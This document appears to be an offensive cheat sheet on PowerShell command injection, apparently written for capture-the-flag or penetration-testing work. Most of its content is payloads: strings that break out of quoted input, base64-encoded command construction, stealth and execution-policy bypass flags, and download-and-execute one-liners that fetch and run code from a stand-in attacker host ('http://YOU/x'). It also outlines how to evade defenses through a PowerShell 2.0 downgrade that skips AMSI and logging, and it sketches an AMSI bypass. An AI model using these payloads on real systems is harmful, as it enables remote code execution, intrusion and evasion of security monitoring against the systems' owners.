# PowerShell Injection — PS grammar and payloads

## The context — when the sink is `powershell`/`pwsh`

`powershell -c x`, `pwsh -Command x`, `System.Diagnostics.Process.Start
("powershell", x)`, PS-hosted endpoints — your input lands inside a PS
pipeline/expression.

## Separators — PS grammar

| Sep | Meaning |
|---|---|
| `;` | statement separator — the main one |
| `\|` | pipeline — objects not text |
| `&` | call operator `& { }`/`& "cmd"` |
| `&&` `\|\|` | pwsh 7+ only |
| `` ` `` | escape char — `` `n `` = newline, `` `" `` = quote |
| `$( )` | subexpression — evaluates inside strings |
| `@( )` | array expression |
| `${var}`/`$var` | var expansion inside `"..."` |
| `'`/`"` | single=literal, double=expanding |
| `#` | comment |

PS 5.1 lacks `&&`/`||` — use `;` or `if(){}`.

## Detection — PS signals

- errors `is not recognized as a cmdlet`
- `$PSVersionTable`/`PSVersion` responses
- `Host`/`$Host` output
- `powershell`/`pwsh` in process name or endpoint
- response format `[pscustomobject]`/`@{x=y}` hashtables

## The expanding-string probe — `"$x"` vs `'$x'`

Inside `"..."`: `$var`, `$(subexpr)`, `` ` `` escapes expand.
Inside `'...'`: nothing expands — literal.

`$(...)` inside double quotes evaluates — same as bash `$()` inside `""`.

## Injection payloads

```powershell
x; whoami
x; Get-Content C:\flag.txt
x; iex 'id'
";$(whoami);"        — close double-quote + subexpr
';whoami;'           — close single-quote
x|ForEach-Object{$_}
$(Get-Content C:\flag.txt)
```

## The iex/`-enc` eval forms

```powershell
iex 'whoami'                        — Invoke-Expression
powershell -enc <b64>               — base64-UTF16LE encoded command
powershell -e / -ec / -en / -enc    — abbreviations all work
powershell -ep bypass               — execution-policy bypass flag
powershell -w hidden / -noni / -nop — stealth flags
& ([scriptblock]::Create('id'))     — scriptblock invoke
. ([scriptblock]::Create('id'))
```

`-enc` is the standard encoded-command form — `iex`+`-enc` shape.

## Encoded command construction

```bash
echo -n 'iex (...)' | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

`powershell -enc <that>` — bypasses quoting issues AND literal-string
filters (the filter sees base64, PS decodes).

## PS exec primitives — the standard calls

```powershell
whoami / hostname / ipconfig / Get-ChildItem
Get-Content C:\flag.txt             — cat
type/gc/cat alias
iex 'cmd'                           — eval
Invoke-Expression / Invoke-Command
Start-Process cmd -ArgumentList '/c id'
[System.Diagnostics.Process]::Start('cmd','/c id')
cmd /c id                           — drop to cmd
& cmd /c whoami                     — call operator
New-Object Net.WebClient            — webclient for download
iwr/irm http://x                    — Invoke-WebRequest/RestMethod
(New-Object Net.WebClient).DownloadString('http://YOU/x')|iex  — download-exec
```

## The `iwr`-download-execute chain

```powershell
iex (iwr http://YOU/x.ps1).Content          — fetch + eval
(New-Object Net.WebClient).DownloadString('http://YOU/x')|iex
powershell -ep bypass -c "iex((New-Object Net.WebClient).DownloadString('http://YOU/x'))"
```

## Alias traps — PS aliases differ from cmd

`cat`/`type`/`gc`/`ls`/`dir`/`cd`/`echo`/`curl`/`wget`/`iex`/`iwr`/`irm` —
many POSIX-sounding names are aliases: `curl`→`Invoke-WebRequest`,
`ls`→`Get-ChildItem`, `cat`→`Get-Content`, `wget`→`Invoke-WebRequest`.

`curl http://x` in PS5.1 = `Invoke-WebRequest` (HTML-parsed response!
not raw) — real curl via `curl.exe` explicit.

## PS injection inside cmd context — `powershell -c "..."`

If the shell is cmd but the app calls `powershell -c "$x"` — your `$x`
lands inside PS's double-quoted string — `"; iex '...';"` closes it —
TWO parsers (cmd → PS) — cmd sees `&`, PS sees `;` — a separator both
honor is `&` (cmd) or `;` inside PS args.

## Constrained Language Mode — `__PSLockdownPolicy`

If CLM is on (`$ExecutionContext.SessionState.LanguageMode` —
`ConstrainedLanguage`) — arbitrary .NET/types blocked; only approved
commands run — the escape needs a bypass (Powershell 5.1 CLM bypasses
exist; the `powershell -v 2` downgrade trick bypasses AMSI).

## `powershell -v 2` — the downgrade

`-v 2`/`powershell.exe -version 2` runs PS 2.0 — no AMSI, no CLM, no
ScriptBlock logging — bypasses modern logging/defenses if installed.

## AMSI — the .NET AV layer

`IEX`/`DownloadString` payloads get AMSI-scanned — patch/bypass via
`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')...`
— the amsi-bypass shape — more relevant post-foothold.

## The "injection point inside a cmdlet call" shape

`Get-Content $x`, `Test-Path $x`, `Copy-Item $x` — the arg is a param
value — `'; ...;'` closes if inside `'...'`, `"; ...; "` inside `"..."`.
Pipeline: `x | % { ... }` ForEach-Object injects into the scriptblock.

## Falsifiers

- argv-position with no flag taking a command AND CLM blocks the needed
  operations
- only cmd.exe context exists (PS payloads dead — see windows-cmdi.md)

## Output to record

- PS vs cmd identified + LanguageMode + working separator/subexpr form
